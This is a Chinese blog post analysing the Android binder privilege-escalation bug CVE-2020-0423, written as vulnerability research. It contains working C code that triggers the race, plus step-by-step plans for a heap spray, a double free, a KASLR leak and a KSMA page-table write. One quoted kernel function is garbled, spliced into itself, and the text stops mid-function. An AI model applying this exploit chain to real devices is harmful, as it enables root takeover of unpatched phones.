> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_37439229/article/details/122844581?spm=1001.2014.3001.5501)

CVE-2020-0423
=============

漏洞简介
----

2020 年 10 月公布了 bulletin，这是最近新的[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)漏洞，存在于 binder 中。  
这个漏洞大致上是 binder 的 sender 和 receive 端的对 binder_node [结构体](https://so.csdn.net/so/search?q=%E7%BB%93%E6%9E%84%E4%BD%93&spm=1001.2101.3001.7020)的 race condition 转化为 uaf 漏洞，作者进一步触发了 double free，结合后续巧妙的堆喷分配，利用 slub 和 ksma 机制，绕过 kalsr 和 cfi 保护，官方给出影响的版本在 Android 8-11 之间

漏洞原理
----

我们从 patch 来明白漏洞点

这是 patch 前

```
// Before the patch

static struct binder_work *binder_dequeue_work_head(
                    struct binder_proc *proc,
                    struct list_head *list)
{
    struct binder_work *w;

    binder_inner_proc_lock(proc);
    w = binder_dequeue_work_head_ilocked(list);
    binder_inner_proc_unlock(proc);
    return w;
}

static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;

    while (1) {
        w = binder_dequeue_work_head(proc, list);
        /*
         * From this point on, there is no lock on `proc` anymore
         * which means `w` could have been freed in another thread and
         * therefore be pointing to dangling memory.
         */
        if (!w)
            return;

        switch (w->type) { /* <--- Use-after-free occurs here */

// [...]

```

这是 pathch 后

```
// After the patch

static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;
    enum binder_work_type wtype;

    while (1) {
        binder_inner_proc_lock(proc);
        /*
         * Since the lock on `proc` is held while calling
         * `binder_dequeue_work_head_ilocked` and reading the `type` field of
         * the resulting `binder_work` stuct, we can be sure its value has not
         * been tampered with.
         */
        w = binder_dequeue_work_head_ilocked(list);
        wtype = w ? w->type : 0;
        binder_inner_proc_unlock(proc);
        if (!w)
            return;

        switch (wtype) { /* <--- Use-after-free not possible anymore */

// [...]

```

我们从 patch 可以看出补丁后主要是扩大了锁的范围，可能这样还看不出来多少，同时我们通过 commit message 来查看漏洞点

![](https://img-blog.csdnimg.cn/28f1b89211d34234a4354f663284f785.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

其中 binder_node 包括了 binder_work

```
struct binder_node {
    int debug_id;
    spinlock_t lock;
    struct binder_work work; //binder_work
    union {
        struct rb_node rb_node;
        struct hlist_node dead_node;
    };
    [...]
}

```

就是条件竞争引发的 uaf 洞，主线程执行 binder_release_work 还没进入 binder_dequeue_work_head 前，子线程就 free 了 binder_node(包含了 binder_work), 而主线程从 todo list 出列释放后的 binder_node 的 binder_work，造成了 uaf

接下来具体分析如何触发漏洞

### binder_work 出队

如何才能执行 binder_release_work(binder 的好多 cve 怎么都触发到这里)

```
int binder_fd = open("/dev/binder", O_RDWR);
// [...]
ioctl(binder_fd, BINDER_THREAD_EXIT, 0);

```

接下来，我们跟踪代码了解流程

ioctl 会调用 binder_ioctl, 当我们的参数是 BINDER_THREAD_EXIT 时

```
static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    // [...]

    case BINDER_THREAD_EXIT:
        binder_debug(BINDER_DEBUG_THREADS, "%d:%d exit\n",
                    proc->pid, thread->pid);
        binder_thread_release(proc, thread);
        thread = NULL;
        break;

    // [...]

```

binder_ioctl 会调用 binder_thread_release

```
static int binder_thread_release(struct binder_proc *proc,
                 struct binder_thread *thread)
{
    // [...]

    binder_release_work(proc, &thread->todo);
    binder_thread_dec_tmpref(thread);
    return active_transactions;
}

```

而后 binder_thread_release 调用 binder_release_work

```
static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;

    while (1) {
        w = binder_dequeue_work_head(proc, list); /* dequeues from thread->todo */
        if (!w)
            return;

    // [...]

```

而后 binder_work 从 todo list 出队，进入漏洞出发点

### binder_work 如何入队

这里主要讲述 binder_work 如何加入 todo list

首先 binder_ioctl BINDER_WRITE_READ 进入 binder_ioctl_write_read

```
static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	[...]

	thread = binder_get_thread(proc);
	[..]

	switch (cmd) {
	case BINDER_WRITE_READ:
		ret = binder_ioctl_write_read(filp, cmd, arg, thread);
		if (ret)
			goto err;
		break;
            [...]
    }

```

之后从 binder_ioctl_write_read 进入 binder_thread_write

```
static int binder_ioctl_write_read(struct file *filp,
				unsigned int cmd, unsigned long arg,
				struct binder_thread *thread)
{
	[...]
    void __user *ubuf = (void __user *)arg;
	struct binder_write_read bwr;

	[...]
	if (copy_from_user(&bwr, ubuf, sizeof(bwr))) {
		ret = -EFAULT;
		goto out;
	}
	if (bwr.write_size > 0) {
		ret = binder_thread_write(proc, thread,
					  bwr.write_buffer,
					  bwr.write_size,
					  &bwr.write_consumed);
		[...]
	}

```

当指令是 BC_transaction 时进入 binder_transaction

```
  static int binder_thread_write(struct binder_proc *proc,
			struct binder_thread *thread,
			binder_uintptr_t binder_buffer, size_t size,
			binder_size_t *consumed)
{
	uint32_t cmd;
	struct binder_context *context = proc->context;
	void __user *buffer = (void __user *)(uintptr_t)binder_buffer;
	void __user *ptr = buffer + *consumed;
	void __user *end = buffer + size;
      [...]
        case BC_TRANSACTION:
		case BC_REPLY: {
			struct binder_transaction_data tr;

			if (copy_from_user(&tr, ptr, sizeof(tr)))
				return -EFAULT;
			ptr += sizeof(tr);
			binder_transaction(proc, thread, &tr,
					   cmd == BC_REPLY, 0);
			break;
		}
      [...]
  }

```

之后从 binder_transaction 当指令是 BINDER_TYPE_BINDER 时进入 binder_translate_binder

```
   static void binder_transaction(struct binder_proc *proc,
			       struct binder_thread *thread,
			       struct binder_transaction_data *tr, int reply,
			       binder_size_t extra_buffers_size)
   {
       
   [...]
        case BINDER_TYPE_BINDER:
		case BINDER_TYPE_WEAK_BINDER: {
			struct flat_binder_object *fp;

			fp = to_flat_binder_object(hdr);
			ret = binder_translate_binder(fp, t, thread);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
        [...]    
            

```

在进入 binder_inc_ref_for_node 之前，对于我们的 flat_binder_object 没有一个 [node](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020) 处理它的话，binder_translate_binder 会调用 binder_new_node 创造一个 node

```
static int binder_translate_binder(struct flat_binder_object *fp,
                   struct binder_transaction *t,
                   struct binder_thread *thread)
{
    	struct binder_node *node;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_ref_data rdata;
	int ret = 0;

	node = binder_get_node(proc, fp->binder);
	if (!node) {
		node = binder_new_node(proc, fp);
		if (!node)
			return -ENOMEM;
	}
    // [...]
    ret = binder_inc_ref_for_node(target_proc, node,
            fp->hdr.type == BINDER_TYPE_BINDER,
            &thread->todo, &rdata);
    // [...]
}

```

对于 binder_inc_ref_for_node 来说

proc 是 binder_proc 当前进程的结构体 node 是我们的目标 node,strong 判断是不是 BINDER_TYPE_BINDER

target_list 就是 todo list ,rdata 是 binder_ref。refcount 数据

```
static int binder_inc_ref_for_node(struct binder_proc *proc,
            struct binder_node *node,
            bool strong,
            struct list_head *target_list,
            struct binder_ref_data *rdata)
{
    // [...]
    ret = binder_inc_ref_olocked(ref, strong, target_list);
    // [...]
}

```

binder_inc_ref_olocked 又调用 binder_inc_node ，这两个主要判断 BINDER_TYPE_BINDER 还是 BINDER_TYPE_WEAK_BINDER

```
static int binder_inc_ref_olocked(struct binder_ref *ref, int strong,
                  struct list_head *target_list)
{
    // [...]
            // Strong ref path
            ret = binder_inc_node(ref->node, 1, 1, target_list);
    // [...]
            // Weak ref path
            ret = binder_inc_node(ref->node, 0, 1, target_list);
    // [...]

}

```

binder_inc_node 就是 binder_inc_node_nilocked 调用了 binder_enqueue_work_ilocked，binder_enqueue_deferred_thread_work_ilocked，要注意这里传的是 & node->work,work 内嵌在 binder_node 里面，所以我们释放的时候就要 free binder_node

```
static int binder_inc_node_nilocked(struct binder_node *node, int strong,
                    int internal,
                    struct list_head *target_list)
{
    // [...]
    if (strong) {
        // [...]
        if (!node->has_strong_ref && target_list) {
            // [...]
            binder_enqueue_deferred_thread_work_ilocked(thread,
                                   &node->work);
        }
    } else {
        // [...]
        if (!node->has_weak_ref && list_empty(&node->work.entry)) {
            // [...]
            binder_enqueue_work_ilocked(&node->work, target_list);
        }
    }
    return 0;
}

```

而这两个都是将 binder_work 加入到 todo list 队里面去

```
static void
binder_enqueue_thread_work_ilocked(struct binder_thread *thread,
                   struct binder_work *work)
{
    binder_enqueue_work_ilocked(work, &thread->todo);
    thread->process_todo = true;
}

static void
binder_enqueue_deferred_thread_work_ilocked(struct binder_thread *thread,
                        struct binder_work *work)
{
    binder_enqueue_work_ilocked(work, &thread->todo);
}

```

从上述路线，可以看出要到达这个函数，我们得先构造 struct flat_binder_object，包装成 struct binder_transaction_data，再包装成 struct binder_write_read，用它来触发 binder_ioctl 才会入队

### 如何 free binder_work(binder_node)

主要是调用这个函数

```
static void binder_free_node(struct binder_node *node)
{
    kfree(node);
    binder_stats_deleted(BINDER_STAT_NODE);
}

```

在 binder_parse 中，回复一个事务时 (binder 的 c/s 结构)，如果是单向事务 TF_ONE_WAY 就调用 binder_free_buffer

```
int binder_parse(struct binder_state *bs, struct binder_io *bio,
                 uintptr_t ptr, size_t size, binder_handler func)
{
        // [...]
        switch(cmd) {
        // [...]
        case BR_TRANSACTION_SEC_CTX:
        case BR_TRANSACTION: {
            // [...]
            if (func) {
                // [...]
                if (txn.transaction_data.flags & TF_ONE_WAY) {
                    binder_free_buffer(bs, txn.transaction_data.data.ptr.buffer);
                } else {
                    binder_send_reply(bs, &reply, txn.transaction_data.data.ptr.buffer, res);
                }
            }
            break;
        }
        // [...]

```

binder_free_buffer 就会以 BC_FREE_BUFFER 调用 binder_thread_write, 到达 BC_FREE_BUFFER, 调用 binder_transaction_buffer_release

```
static int binder_thread_write(struct binder_proc *proc,
            struct binder_thread *thread,
            binder_uintptr_t binder_buffer, size_t size,
            binder_size_t *consumed)
{
        // [...]
        case BC_FREE_BUFFER: {
            // [...]
            binder_transaction_buffer_release(proc, buffer, 0, false);
            // [...]
        }
        // [...]

```

binder_transaction_buffer_release 会根据指令的类型来选择释放, 入队时选择的是 BINDER_TYPE_HANDLE

```
static void binder_transaction_buffer_release(struct binder_proc *proc,
                          struct binder_buffer *buffer,
                          binder_size_t failed_at,
                          bool is_failure)
{
        // [...]
        switch (hdr->type) {
        // [...]
        case BINDER_TYPE_HANDLE:
        case BINDER_TYPE_WEAK_HANDLE: {
            struct flat_binder_object *fp;
            struct binder_ref_data rdata;
            int ret;
            fp = to_flat_binder_object(hdr);
            ret = binder_dec_ref_for_handle(proc, fp->handle,
                hdr->type == BINDER_TYPE_HANDLE, &rdata);
            // [...]
        } break;
        // [...]

```

binder_dec_ref_for_handle 会将减少句柄上的引用, 如果引用为 0, 就 free_ref

```
static int binder_update_ref_for_handle(struct binder_proc *proc,
        uint32_t desc, bool increment, bool strong,
        struct binder_ref_data *rdata)
{
    // [...]
    if (increment)
        ret = binder_inc_ref_olocked(ref, strong, NULL);
    else
        /* 
         * Decrements the reference count by one and returns true since it
         * dropped to zero
         */
        delete_ref = binder_dec_ref_olocked(ref, strong);
    // [...]
    /* delete_ref is true, the binder node is freed */
    if (delete_ref)
        binder_free_ref(ref);
    return ret;
    // [...]
}

```

调用 binder_free_ref,kfree node 了

```
static void binder_free_ref(struct binder_ref *ref)
{
    if (ref->node)
        binder_free_node(ref->node);
    kfree(ref->death);
    kfree(ref);
}

```

因而明白了触发漏洞的思路

首先我们自己向 binder 发送一个 BINDER_TYPE_BINDER TF_ONE_WAY 的事务，binder 会创建一个 binder_node, 并将该 binder_node 的 work 加入 binder_thread->todo list 里面去  
![](https://img-blog.csdnimg.cn/f0598432787f4c4e82e7f458d65bc15a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

之后我们进程使用 BINDER_THREAD_EXIT 启动清理过程，调用 binder_release_work, 把我们的 node.work 出 todo list 的队

![](https://img-blog.csdnimg.cn/30698271d15046e387688a8f0858ebea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

因为我们设置的是 TF_ONE_WAY，之后 binder 就会在出队之后和使用之前 free 掉 binder_node，造成 uaf

![](https://img-blog.csdnimg.cn/825f26f32fa84049b158488fb7dbef8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

首先根据我们之前分析的 work 入 todo list 队, 构造一个符合条件，通过前面所有检查的 trnasaction

```
static inline void init_binder_transaction(int nb) {
    /*
     * Writes `nb` times a BINDER_TYPE_BINDER object in the object buffer
     * and updates the offsets in the offset buffer accordingly
     */
    for (int i = 0; i < nb; i++) {
        struct flat_binder_object *fbo =
            (struct flat_binder_object *)((void*)(MEM_ADDR + 0x400LL + i*sizeof(*fbo)));
        fbo->hdr.type = BINDER_TYPE_BINDER;
        fbo->binder = i;
        fbo->cookie = i;
        uint64_t *offset = (uint64_t *)((void *)(MEM_ADDR + OFFSETS_START + 8LL*i));
        *offset = i * sizeof(*fbo);
    }

    /*
     * Binder transaction data referencing the offset and object buffers
     */
    struct binder_transaction_data btd2 = {
        .flags = TF_ONE_WAY, /* we don't need a reply */
        .data_size = 0x28 * nb,
        .offsets_size = 8 * nb,
        .data.ptr.buffer = MEM_ADDR  + 0x400,
        .data.ptr.offsets = MEM_ADDR + OFFSETS_START,
    };

    uint64_t txn_size = sizeof(uint32_t) + sizeof(btd2);

    /* Transaction command */
    *(uint32_t*)(MEM_ADDR + 0x200) = BC_TRANSACTION;
    memcpy((void*)(MEM_ADDR + 0x204), &btd2, sizeof(btd2));

    /* Binder write/read structure sent to binder */
    struct binder_write_read bwr = {
        .write_size = txn_size * (1), // 1 txno
        .write_buffer = MEM_ADDR + 0x200
    };
    memcpy((void*)(MEM_ADDR + 0x100), &bwr, sizeof(bwr));
}

```

open("/dev/binder",O_RDWR), 入队，然后出队

```
void *trigger_thread_func(void *argp) {
    unsigned long id = (unsigned long)argp;
    int ret = 0;
    int binder_fd = -1;
    int binder_fd_copy = -1;

    // Opening binder device
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0)
        perror("An error occured while opening binder");

    for (;;) {
        // Refill the memory region with the transaction
        init_binder_transaction(1);
        // Copying the binder fd
        binder_fd_copy = dup(binder_fd);
        // Sending the transaction
        ret = ioctl(binder_fd_copy, BINDER_WRITE_READ, MEM_ADDR + 0x100);
        if (ret != 0)
            debug_printf("BINDER_WRITE_READ did not work: %d", ret);
        // Binder thread exit
        ret = ioctl(binder_fd_copy, BINDER_THREAD_EXIT, 0);
        if (ret != 0)
            debug_printf("BINDER_WRITE_EXIT did not work: %d", ret);
        // Closing binder device
        close(binder_fd_copy);
    }

    return NULL;
}

```

多线程调用，更大概率可以触发到

```
int main() {
    pthread_t trigger_threads[NB_TRIGGER_THREADS];

    // Memory region for binder transactions
    mmap((void*)MEM_ADDR, MEM_SIZE, PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    // Init random
    srand(time(0));

    // Get rid of stdout/stderr buffering
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Starting trigger threads
    debug_print("Starting trigger threads");
    for (unsigned long i = 0; i < NB_TRIGGER_THREADS; i++) {
        pthread_create(&trigger_threads[i], NULL, trigger_thread_func, (void*)i);
    }
    // Waiting for trigger threads
    for (int i = 0; i < NB_TRIGGER_THREADS; i++)
        pthread_join(trigger_threads[i], NULL);

    return 0;
}

```

漏洞利用
----

在这里，主要说一下漏洞利用思路，目前利用脚本还没有写成功

由于已经造成了 uaf, 所以接下来的想法就是堆喷喷上去，最好是里面的内容是我们自己伪造的，这样我们就可以控制 binder_release_work 的后续流程了

```
static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;
    while (1) {
        w = binder_dequeue_work_head(proc, list);
        if (!w)
            return;

        switch (w->type) { /* <-- Value controlled with the use-after-free */
        // [...]
        default:
            pr_err("unexpected work type, %d, not freed\n",
                   w->type);
            break;
        }
    }
}

```

在 android kernel 中 slab 最小的是 kmalloc-128 而 binder_node 结构体大小为 128，因而我们应该 kernel，malloc 一个大小小于等于 128 的堆才有可能喷的上，在这里作者使用的是 sendmsg 和 signalfd 来喷的，在次看一下源码，了解是如何喷上去的

```
static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,
			 struct msghdr *msg_sys, unsigned int flags,
			 struct used_address *used_address,
			 unsigned int allowed_msghdr_flags)
{
	struct compat_msghdr __user *msg_compat =
	    (struct compat_msghdr __user *)msg;
	struct sockaddr_storage address;
	struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
	unsigned char ctl[sizeof(struct cmsghdr) + 20]
				__aligned(sizeof(__kernel_size_t));
	/* 20 is size of ipv6_pktinfo */
	unsigned char *ctl_buf = ctl;
	int ctl_len;
	ssize_t err;

	msg_sys->msg_name = &address;

	if (MSG_CMSG_COMPAT & flags)
		err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
	else
		err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov);
	if (err < 0)
		return err;

	err = -ENOBUFS;

	if (msg_sys->msg_controllen > INT_MAX)
		goto out_freeiov;
	flags |= (msg_sys->msg_flags & allowed_msghdr_flags);
	ctl_len = msg_sys->msg_controllen;
	if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
		err =
		    cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl,
						     sizeof(ctl));
		if (err)
			goto out_freeiov;
		ctl_buf = msg_sys->msg_control;
		ctl_len = msg_sys->msg_controllen;
	} else if (ctl_len) {
		BUILD_BUG_ON(sizeof(struct cmsghdr) !=
			     CMSG_ALIGN(sizeof(struct cmsghdr)));
		if (ctl_len > sizeof(ctl)) {
	【1】		ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
			if (ctl_buf == NULL)
				goto out_freeiov;
		}
		err = -EFAULT;
		
【2】		if (copy_from_user(ctl_buf,
				   (void __user __force *)msg_sys->msg_control,
				   ctl_len))
			goto out_freectl;
		msg_sys->msg_control = ctl_buf;
	}
	msg_sys->msg_flags = flags;

	if (sock->file->f_flags & O_NONBLOCK)
		msg_sys->msg_flags |= MSG_DONTWAIT;
	
	if (used_address && msg_sys->msg_name &&
	    used_address->name_len == msg_sys->msg_namelen &&
	    !memcmp(&used_address->name, msg_sys->msg_name,
		    used_address->name_len)) {
		err = sock_sendmsg_nosec(sock, msg_sys);
		goto out_freectl;
	}
	err = sock_sendmsg(sock, msg_sys);
	/*
	 * If this is sendmmsg() and sending to current destination address was
	 * successful, remember it.
	 */
	if (used_address && err >= 0) {
		used_address->name_len = msg_sys->msg_namelen;
		if (msg_sys->msg_name)
			memcpy(&used_address->name, msg_sys->msg_name,
			       used_address->name_len);
	}

out_freectl:
	if (ctl_buf != ctl)
	【3】	sock_kfree_s(sock->sk, ctl_buf, ctl_len);
out_freeiov:
	kfree(iov);
	return err;
}

```

注意我标记的【1】【2】【3】

【1】表面 当 ctl_len> 44(ctl 的结构体）时，就会 malloc

【2】将我们用户空间的内容原封不动的 copy 到 ctl_buf 上

【3】最后 malloc 的 ctl_buf 会释放

signalfd 就是简单的 malloc 8 个字节，而且很稳定，不会被系统释放，由于在 android 上最小的就是 kmalloc-128, 所以再调用完 sendmsg 后调用 signalfd 就会占据我们的堆，同时不会将我们再 sendmsg copy_from_user 的内容置 0，所以流程如图

![](https://img-blog.csdnimg.cn/a56e2bec681a4fa29b81a0d5a28a110f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

因而我们可以伪造控制 Binder_release_work 后续内容

```
static void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;
    while (1) {
        w = binder_dequeue_work_head(proc, list);
        if (!w)
            return;

        switch (w->type) {
        case BINDER_WORK_TRANSACTION: {
            struct binder_transaction *t;
            t = container_of(w, struct binder_transaction, work);
            binder_cleanup_transaction(t, "process died.",
                           BR_DEAD_REPLY);
        } break;
        case BINDER_WORK_RETURN_ERROR: {
            struct binder_error *e = container_of(
                    w, struct binder_error, work);
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered TRANSACTION_ERROR: %u\n",
                e->cmd);
        } break;
        case BINDER_WORK_TRANSACTION_COMPLETE: {
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered TRANSACTION_COMPLETE\n");
            kfree(w);
            binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
        } break;
        case BINDER_WORK_DEAD_BINDER_AND_CLEAR:
        case BINDER_WORK_CLEAR_DEATH_NOTIFICATION: {
            struct binstatic void binder_release_work(struct binder_proc *proc,
                struct list_head *list)
{
    struct binder_work *w;
    while (1) {
        w = binder_dequeue_work_head(proc, list);
        if (!w)
            return;

        switch (w->type) {
        case BINDER_WORK_TRANSACTION: {
            struct binder_transaction *t;
            t = container_of(w, struct binder_transaction, work);
            binder_cleanup_transaction(t, "process died.",
                           BR_DEAD_REPLY);
        } break;
        case BINDER_WORK_RETURN_ERROR: {
            struct binder_error *e = container_of(
                    w, struct binder_error, work);
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered TRANSACTION_ERROR: %u\n",
                e->cmd);
        } break;
        case BINDER_WORK_TRANSACTION_COMPLETE: {
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered TRANSACTION_COMPLETE\n");
            kfree(w);
            binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
        } break;
        case BINDER_WORK_DEAD_BINDER_AND_CLEAR:
        case BINDER_WORK_CLEAR_DEATH_NOTIFICATION: {
            struct binder_ref_death *death;
            death = container_of(w, struct binder_ref_death, work);
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered death notification, %016llx\n",
                (u64)death->cookie);
            kfree(death);
            binder_stats_deleted(BINDER_STAT_DEATH);
        } break;
        default:
            pr_err("unexpected work type, %d, not freed\n",
                   w->type);
            break;
        }
    }
}der_ref_death *death;
            death = container_of(w, struct binder_ref_death, work);
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered death notification, %016llx\n",
                (u64)death->cookie);
            kfree(death);
            binder_stats_deleted(BINDER_STAT_DEATH);
        } break;
        default:
            pr_err("unexpected work type, %d, not freed\n",
                   w->type);
            break;
        }
    }
}

```

通过查看 binder_release_work，可以知道如果 binder_node 在 x 地址的话，binder_work 在 x+8 地址的话

*   `BINDER_WORK_TRANSACTION` will free `X`
    
*   `BINDER_WORK_TRANSACTION_COMPLETE`, `BINDER_WORK_DEAD_BINDER_AND_CLEAR` and `BINDER_WORK_CLEAR_DEATH_NOTIFICATION` will free `X+8`
    
    作者在这里选择了 BINDER_WORK_TRANSACTION 情况，接着来看 binder_cleanup_transaction, 如何伪造满足条件
    
    ```
    static void binder_cleanup_transaction(struct binder_transaction *t,
                           const char *reason,
                           uint32_t error_code)
    {
        if (t->buffer->target_node && !(t->flags & TF_ONE_WAY)) {
            binder_send_failed_reply(t, error_code);
        } else {
            binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                "undelivered transaction %d, %s\n",
                t->debug_id, reason);
            binder_free_transaction(t);
        }
    }
    
    
    ```
    
    t->buffer 必须是 kernel address ,t->flags 必须是 TF_ONE_WAY
    
    ```
    static void binder_free_transaction(struct binder_transaction *t)
    {
        struct binder_proc *target_proc = t->to_proc;
        if (target_proc) {
            binder_inner_proc_lock(target_proc);
            if (t->buffer)
                t->buffer->transaction = NULL;
            binder_inner_proc_unlock(target_proc);
        }
        /*
         * If the transaction has no target_proc, then
         * t->buffer->transaction has already been cleared.
         */
        kfree(t);
        binder_stats_deleted(BINDER_STAT_TRANSACTION);
    }
    
    ```
    
    t->to_proc 必须是 NULL, 从而 free 掉了 binder_node, 如果我们在用户空间再自我 free 掉 signalfd 的话，就造成了
    
    double free 的情况
    

![](https://img-blog.csdnimg.cn/004c52ee5f1044c78e7b0a9ed0186a45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

接下来就 2 个目的了，【1】泄露 kaslr 【2】ksma 攻击

### leak kaslr

signalfd 是 leak kaslr 的一个重点，它有三个功能

【1】使用 kmalloc-128 且不初始化其他部分

【2】可以在分配地址读取一个 8 字节的值

【3】可以在分配地址写入几乎任意的 8 字节值

步骤：

（1）使用 double free 来泄露 signalfd, 在程序运行完 binder_free_transaction 后，就造成了 double free,

（2）这时候我们再 senfmsg signalfd(fd2), 通过读取 fd2 地址上的值，判断是否于第一次堆喷 uaf 的 signalfd(fd1) 上的 binder_work ->type 是否一致，

（3）如果一样，说明 fd2 和 fd1 重叠了，fd1 和 fd2 指向同一个地址，接着释放 fd1, 再堆喷一个具有函数指针的结构体，

（4）堆喷成功后，通过 fd2 读取该函数指针，从而泄露 kaslr

作者在这里选用的堆喷结构体是 seq_operations

```
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};

```

通过 fd2 正好读取 start 函数的地址

当调用 single_open 就会分配 seq_operations , 而 single_open 被调用当交互 / proc 文件系统时 作者在这里选用了 / proc/self/stat

/proc/self/stat 在 `proc_stat_init`中创建 ，当 open 这个文件时调用 [`stat_open`]

```
static int __init proc_stat_init(void)
{
    proc_create("stat", 0, NULL, &proc_stat_operations);
    return 0;
}
fs_initcall(proc_stat_init);

static const struct file_operations proc_stat_operations = {
    .open       = stat_open,
    .read       = seq_read,
    .llseek     = seq_lseek,
    .release    = single_release,
};

static int stat_open(struct inode *inode, struct file *file)
{
    unsigned int size = 1024 + 128 * num_online_cpus();
    /* minimum size to display an interrupt count : 2 bytes */
    size += 2 * nr_irqs;
    return single_open_size(file, show_stat, NULL, size);
}

```

继续跟踪发现在 single_open_size 中调用了 single_open

```
int single_open_size(struct file *file, int (*show)(struct seq_file *, void *),
        void *data, size_t size)
{
    char *buf = seq_buf_alloc(size);
    int ret;
    if (!buf)
        return -ENOMEM;
    ret = single_open(file, show, data);
    if (ret) {
        kvfree(buf);
        return ret;
    }
    ((struct seq_file *)file->private_data)->buf = buf;
    ((struct seq_file *)file->private_data)->size = size;
    return 0;
}

```

而在 single_open 函数中

```
int single_open(struct file *file, int (*show)(struct seq_file *, void *),
        void *data)
{
    struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);
    int res = -ENOMEM;
    if (op) {
        op->start = single_start;
        op->next = single_next;
        op->stop = single_stop;
        op->show = show;
        res = seq_open(file, op);
        if (!res)
            ((struct seq_file *)file->private_data)->private = data;
        else
            kfree(op);
    }
    return res;
}

```

如果我们堆喷成功，我们就可以读取 single_start 的地址，

可问题是 single_open 有两次 malloc, 一次是分配

seq_operation, 一次是在 seq_open 中都是 kmalloc-128，

因而为了确定是否喷对了结构体. 我们必须有个判断，kaslr 的低位的偏移量是不会发生改变的，因此我们先 cat /proc/kallsyms | grep “single_open” 读取的数值再于我们 fd2 读取的相减。如果低位是 0，说明堆喷成功了

```
(kaslr_leak - single_start_offset) & 0xffff == 0

```

### ksma 攻击

这个部分只能说是太巧妙了，还是利用了 double free 来进行攻击提权的

leak 了 kaslr, 通过 cat "swapper_pg_dir" 知道了一级页表的储存地址

```
flame:/ # grep -i -e " swapper_pg_dir" /proc/kallsyms
ffffff886f2b5000 B swapper_pg_dir

```

为了不影响原来的 kernel address kernel data , 作者映射的地址为

```
0xffffff8000000000 + 0x1e0 * 0x40000000 = 0xfffffff800000000

```

通过

```
flame:/ # grep "Kernel code" /proc/iomem
  80080000-823affff : Kernel code

```

作者为了对齐，映射的物理地址为 0x80000000

关闭 pxn，kaslr, 权限设置为可读可写，对此 block descriptor

```
0x00e8000000000751 | 0x80000000 = 0x00e8000080000751

```

如果我们 ksma 攻击成功，即在

```
swapper_pg_dir + 8*0x1e0

```

地址写上 0x00e8000080000751，那么在 0xfffffff800000000～（0xfffffff800000000 + 1gb）上映射从 0x80000000 物理地址开始的一个 gb，

其中包含所有的 kernel code kernel data, 我们即可以在 0xfffffff800000000 + 对应偏移上任意更改 kernel 中的任何函数 任何数据，

对此我们需要有一次对内核任意地址写的权限，即可完成 ksma 攻击，进而提权就是小 case 了，

接下来，我们来看作者是如何得到机会获得一次对内核地址任意写的权限的

我们有两个 signalfd 指向同一块 chunk，我们释放掉一个，对此，对此这块 chunk 就会加入到 freelist 行列去，这块内存的开头存放之前被 free 的 chunk 地址，

而我们还有个 signalfd 指向这块 chunk, 对此通过 signalfd 改写这个地址改成我们想要的地址，我们就有机会堆喷喷到我们改写的地址上，

可是通过 signalfd 写入有一个问题

```
SYSCALL_DEFINE4(signalfd4, int, ufd, sigset_t __user *, user_mask,
		size_t, sizemask, int, flags)
{
